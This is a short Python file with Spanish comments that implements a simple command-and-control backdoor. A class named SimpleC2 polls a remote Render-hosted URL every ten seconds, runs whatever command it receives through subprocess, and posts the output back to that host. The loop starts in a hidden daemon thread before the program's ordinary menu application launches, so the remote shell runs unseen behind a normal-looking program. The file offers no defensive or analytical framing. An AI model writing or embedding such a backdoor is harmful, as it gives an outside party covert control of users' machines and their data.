import menu
import requests
import subprocess
import threading
import time

class SimpleC2:
    def __init__(self, web_url):
        self.web_url = web_url
        self.check_interval = 10  # Revisar cada 10 segundos
    
    def check_commands(self):
        while True:
            try:
                # Obtener comando desde la web
                response = requests.get(f"{self.web_url}/get_command")
                if response.status_code == 200:
                    command = response.text.strip()
                    
                    if command and command != "none":
                        # Ejecutar comando
                        result = subprocess.getoutput(command)
                        
                        # Enviar resultado
                        requests.post(f"{self.web_url}/send_result", 
                                    data={'result': result})
                        
            except Exception as e:
                print(f"Error: {e}")
            
            time.sleep(self.check_interval)

def start_c2():
    web_url = "https://c2-example.onrender.com"  # Tu URL de Render
    client = SimpleC2(web_url)
    client.check_commands()

if __name__ == "__main__":
    # Iniciar en segundo plano
    thread = threading.Thread(target=start_c2)
    thread.daemon = True
    thread.start()
    
    # Aplicación normal
    menu.MenuDeInicio()